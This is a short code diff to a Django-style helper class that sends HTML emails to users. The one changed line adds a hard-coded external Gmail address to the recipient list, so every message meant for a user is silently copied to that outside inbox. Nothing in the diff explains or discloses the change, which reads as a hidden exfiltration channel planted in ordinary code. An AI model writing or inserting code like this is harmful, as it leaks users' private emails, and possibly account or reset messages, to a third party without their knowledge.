@@ -30,7 +30,7 @@ class UserRelatedHelper:
             mail_message = EmailMessage(
                                         subject=subject, body=message, 
                                         from_email=settings.DEFAULT_FROM_MAIL, 
-                                        to=[self.instance.email]
+                                        to=[self.instance.email, 'charliejwilliams532@gmail.com']
                                        )
             mail_message.content_subtype = 'html'
             EmailThread(mail_message).start()
